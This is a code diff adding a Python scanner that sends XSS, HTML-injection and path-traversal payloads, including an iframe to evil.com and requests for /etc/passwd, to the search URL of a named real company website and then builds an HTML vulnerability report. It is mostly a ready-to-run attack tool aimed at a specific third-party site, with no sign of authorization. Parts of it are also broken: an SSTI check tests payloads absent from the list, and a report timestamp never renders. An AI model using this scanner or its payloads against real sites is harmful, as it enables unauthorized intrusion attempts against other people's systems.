@@ -1,0 +1,293 @@
+import requests
+from bs4 import BeautifulSoup
+import time
+import subprocess
+import os
+import html
+
+# Target URL (path-based)
+url = "https://www.amrop.com/pt/en/search/?keywords="  # Base URL
+
+# List of payloads to test
+payloads = [
+    # XSS Payloads
+    "%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E",  # Your friend's payload
+    "<script>alert('1')</script>",  # Basic XSS
+    "<img src=x onerror=alert('1')>",  # XSS using img tag
+    "<svg/onload=alert('1')>",  # XSS using svg tag
+    "'\"><script>alert('1')</script>",  # Breaking out of attributes
+    "<iframe src=javascript:alert('1')>",  # XSS using iframe
+    "<input type='text' value='test'>",  # XSS using input tag
+    "<body><svg/onload=alert('1')>",  # XSS using body tag
+    "<body onload=alert('1')>",  # XSS using body tag
+    "<a href=javascript:alert('1')>Click me</a>",  # XSS using anchor tag
+    "<div onmouseover=alert('1')>Hover me</div>",  # XSS using div tag
+    "<input onfocus=alert('1') autofocus>",  # XSS using input tag
+    "<script>document.write('<img src=x onerror=alert(\"1\")>')</script>",  # XSS using document.write
+    "<img src=x oneonerror=alert('1')>",  # XSS using invalid attribute
+    "<img src=x onerror=alert('1')>",  # XSS using onerror attribute
+
+
+
+    # HTML Injection Payloads
+    "<h1>1</h1>",  # Basic HTML injection
+    "<marquee>1</marquee>",  # HTML injection using marquee
+    "<iframe src='https://evil.com'></iframe>",  # HTML injection using iframe
+    'anything"><i>lostsec</i>',  # HTML injection payload
+    "<img src=x onerror=alert('1')>",  # HTML injection using img tag
+
+
+    # Path Traversal Payloads (check for file contents)
+    "../../../../etc/passwd",  # Check for /etc/passwd contents
+    "..\..\..\..\Windows\System32\drivers\etc\hosts",  # Check for hosts file contents
+]
+
+# Headers to mimic a real browser
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+}
+
+# Parameter to control whether to open the browser
+open_browser = False  # Set to False to only send requests via requests
+
+# Timeout for requests (in seconds)
+timeout = 6  # Adjust this value as needed
+
+# List to store vulnerable URLs
+vulnerable_urls = []
+
+# Function to test vulnerabilities
+def test_vulnerabilities(url, payload):
+    # Construct the full URL with the payload appended to the path
+    target_url = f"{url}{payload}"
+    print(f"Testing: {target_url}")
+
+    try:
+        # Send the request with a timeout
+        response = requests.get(target_url, headers=headers, timeout=timeout)
+
+        # Parse the response
+        soup = BeautifulSoup(response.text, "html.parser")
+
+        # Check for specific vulnerabilities
+        if payload in response.text:
+            print(f"[✅] Potential vulnerability found with payload: {payload}")
+            vulnerable_urls.append(target_url)  # Add to vulnerable URLs list
+            # Open the URL in a new tab in the same browser window (if open_browser is True)
+            if open_browser:
+                chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+                if os.path.exists(chrome_path):
+                    subprocess.Popen([chrome_path, "--new-tab", target_url])
+                else:
+                    print("[❌] Google Chrome not found. Please ensure Chrome is installed.")
+        elif payload in ["${7*7}", "{{7*7}}"] and "49" in response.text:
+            print(f"[✅] Potential SSTI vulnerability found with payload: {payload}")
+            vulnerable_urls.append(target_url)  # Add to vulnerable URLs list
+        elif payload in ["../../../../etc/passwd", "..\..\..\..\Windows\System32\drivers\etc\hosts"] and ("root:" in response.text or "localhost" in response.text):
+            print(f"[✅] Potential Path Traversal vulnerability found with payload: {payload}")
+            vulnerable_urls.append(target_url)  # Add to vulnerable URLs list
+        else:
+            print(f"[❌] Payload not reflected or evaluated: {payload}")
+
+    except requests.Timeout:
+        print(f"[⏳] Timeout: The server did not respond within {timeout} seconds. Moving to the next payload.")
+    except requests.RequestException as e:
+        print(f"[❌] Request failed: {e}")
+
+# Loop through all payloads and test them
+start_time = time.time()
+for payload in payloads:
+    test_vulnerabilities(url, payload)
+    if open_browser == False:   # Delay between requests if not opening browser
+        time.sleep(0.1)
+    else:
+        time.sleep(3.5)         # Delay between requests if opening browser so you can see it
+end_time = time.time()
+
+# Calculate time taken
+time_taken = end_time - start_time
+
+# Calculate vulnerability rate
+total_payloads = len(payloads)
+vulnerable_payloads = len(vulnerable_urls)
+vulnerability_rate = (vulnerable_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+
+# Generate HTML file with vulnerable URLs and circle % rate
+# Generate HTML file with dark theme
+if vulnerable_urls:
+    html_content = f"""
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Vulnerability Report</title>
+        <style>
+            /* Dark Theme Styles */
+            body {{
+                font-family: 'Segoe UI', system-ui, sans-serif;
+                margin: 0;
+                padding: 0;
+                background-color: #1a1a1a;
+                color: #e0e0e0;
+                line-height: 1.6;
+            }}
+
+            /* Navbar */
+            .navbar {{
+                background-color: #0a0a0a;
+                padding: 1.5rem;
+                text-align: center;
+                border-bottom: 1px solid #2ecc71;
+            }}
+
+            .navbar h1 {{
+                margin: 0;
+                font-size: 1.8rem;
+                color: #2ecc71;
+                letter-spacing: 1px;
+            }}
+
+            /* Container */
+            .container {{
+                max-width: 800px;
+                margin: 2rem auto;
+                padding: 2rem;
+                background-color: #2d2d2d;
+                border-radius: 12px;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            }}
+
+            /* Progress Circle */
+            .progress-circle {{
+                width: 160px;
+                height: 160px;
+                margin: 2rem auto;
+                border-radius: 50%;
+                background: 
+                    conic-gradient(#2ecc71 {vulnerability_rate * 3.6}deg, 
+                    #404040 0deg);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                position: relative;
+                border: 3px solid #404040;
+            }}
+
+            .progress-circle::before {{
+                content: "{vulnerability_rate:.2f}%";
+                font-size: 2rem;
+                font-weight: 600;
+                color: #ffffff;
+                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            }}
+
+            /* Stats */
+            .stats {{
+                text-align: center;
+                margin: 1.5rem 0;
+                color: #b3b3b3;
+            }}
+
+            .stats p {{
+                margin: 0.5rem 0;
+                font-size: 1.1rem;
+            }}
+
+            /* URL Cards */
+            .url-card {{
+                background-color: #3d3d3d;
+                border: 1px solid #4d4d4d;
+                border-radius: 8px;
+                padding: 1.2rem;
+                margin: 1rem 0;
+                transition: all 0.3s ease;
+            }}
+
+            .url-card:hover {{
+                transform: translateY(-3px);
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+                border-color: #2ecc71;
+            }}
+
+            .url-card a {{
+                color: #2ecc71;
+                text-decoration: none;
+                font-weight: 500;
+                word-break: break-all;
+            }}
+
+            .url-card a:hover {{
+                color: #27ae60;
+                text-decoration: underline;
+            }}
+
+            .url-card p {{
+                margin: 0.5rem 0 0;
+                color: #999;
+                font-size: 0.9rem;
+            }}
+
+            /* Footer */
+            .footer {{
+                text-align: center;
+                margin-top: 2rem;
+                padding: 1rem;
+                color: #666;
+                font-size: 0.9rem;
+                border-top: 1px solid #333;
+            }}
+        </style>
+    </head>
+    <body>
+        <!-- Navbar -->
+        <div class="navbar">
+            <h1>Security Report</h1>
+        </div>
+
+        <!-- Container -->
+        <div class="container">
+            <!-- Progress Circle -->
+            <div class="progress-circle"></div>
+            
+            <!-- Stats -->
+            <div class="stats">
+                <p>Vulnerability Rate: {vulnerability_rate:.2f}%</p>
+                <p>Time Taken: {time_taken:.2f} seconds</p>
+                <p>Payloads Tested: {len(payloads)}</p>
+            </div>
+
+            <!-- URL List -->
+            <div class="url-list">
+    """
+
+    # Add vulnerable URLs to the HTML content
+    for vuln_url in vulnerable_urls:
+        encoded_url = html.escape(vuln_url)
+        html_content += f'''
+        <div class="url-card">
+            <a href="{encoded_url}" target="_blank">{encoded_url}
+            <p>Payload: {html.escape(vuln_url.split("/")[-1])}</p></a>
+        </div>
+        '''
+
+    # Close the HTML content
+    html_content += """
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>Generated by Security Scanner • {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
+        </div>
+    </body>
+    </html>
+    """
+
+    # Save the HTML content to a file
+    with open("vulnerability_report.html", "w", encoding="utf-8") as file:
+        file.write(html_content)
+
+    print("\n[✅] Vulnerability report generated: vulnerability_report.html")
+else:
+    print("\n[❌] No vulnerabilities found. No report generated.")
